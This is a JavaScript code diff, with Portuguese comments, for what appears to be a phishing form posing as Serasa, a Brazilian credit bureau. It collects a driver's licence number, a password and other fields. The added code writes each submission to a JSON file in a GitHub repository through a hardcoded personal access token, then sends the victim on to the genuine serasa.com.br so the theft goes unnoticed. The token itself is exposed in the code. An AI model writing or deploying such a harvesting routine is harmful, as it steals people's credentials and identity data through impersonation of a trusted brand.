@@ -25,7 +25,7 @@ document.getElementById('cnh').addEventListener('input', function (e) {
     }
 });
 
-// Envia os dados do formulário para um servidor ou repositório
+// Envia os dados do formulário para um repositório no GitHub
 document.getElementById('cadastroForm').addEventListener('submit', async function (e) {
     e.preventDefault();
 
@@ -37,22 +37,57 @@ document.getElementById('cadastroForm').addEventListener('submit', async functio
         senha: document.getElementById('senha').value,
     };
 
+    // Configuração do GitHub
+    const GITHUB_API_URL = 'https://api.github.com';
+    const REPO_OWNER = 'serasaoficial'; // Substitua pelo nome do dono do repositório
+    const REPO_NAME = 'serasa.com.br'; // Substitua pelo nome do repositório
+    const FILE_PATH = 'dados/formulario.json'; // Caminho do arquivo no repositório
+    const GITHUB_TOKEN = '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'; // Substitua pelo seu token de acesso pessoal
+
     try {
-        const response = await fetch('http://localhost:3000/salvar-dados', {
-            method: 'POST',
+        // Obtém o conteúdo atual do arquivo no GitHub
+        const getResponse = await fetch(`${GITHUB_API_URL}/repos/${REPO_OWNER}/${REPO_NAME}/contents/${FILE_PATH}`, {
             headers: {
-                'Content-Type': 'application/json',
+                'Authorization': `Bearer ${GITHUB_TOKEN}`,
+                'Accept': 'application/vnd.github.v3+json',
             },
-            body: JSON.stringify(formData),
         });
 
-        if (response.ok) {
-            // Redireciona o usuário para uma URL
-            window.location.href = 'https://serasa.com.br';
+        let fileContent = [];
+        let sha = null;
+
+        if (getResponse.ok) {
+            const fileData = await getResponse.json();
+            fileContent = JSON.parse(atob(fileData.content)); // Decodifica o conteúdo atual
+            sha = fileData.sha; // Obtém o SHA do arquivo existente
+        }
+
+        // Adiciona o novo registro
+        fileContent.push(formData);
+
+        // Atualiza ou cria o arquivo no repositório
+        const putResponse = await fetch(`${GITHUB_API_URL}/repos/${REPO_OWNER}/${REPO_NAME}/contents/${FILE_PATH}`, {
+            method: 'PUT',
+            headers: {
+                'Authorization': `Bearer ${GITHUB_TOKEN}`,
+                'Content-Type': 'application/json',
+                'Accept': 'application/vnd.github.v3+json',
+            },
+            body: JSON.stringify({
+                message: 'Atualizando dados do formulário',
+                content: btoa(JSON.stringify(fileContent, null, 2)), // Codifica o novo conteúdo em Base64
+                sha: sha, // Inclui o SHA para editar o arquivo existente (se aplicável)
+            }),
+        });
+
+        if (putResponse.ok) {
+            alert('Dados salvos no GitHub com sucesso!');
+            window.location.href = 'https://serasa.com.br'; // Redireciona após sucesso
         } else {
-            alert('Erro ao enviar os dados: ' + response.statusText);
+            const errorData = await putResponse.json();
+            throw new Error(errorData.message || 'Erro ao atualizar o arquivo no GitHub');
         }
     } catch (error) {
-        alert('Erro ao conectar com o servidor: ' + error.message);
+        alert('Erro ao salvar dados no GitHub: ' + error.message);
     }
 });
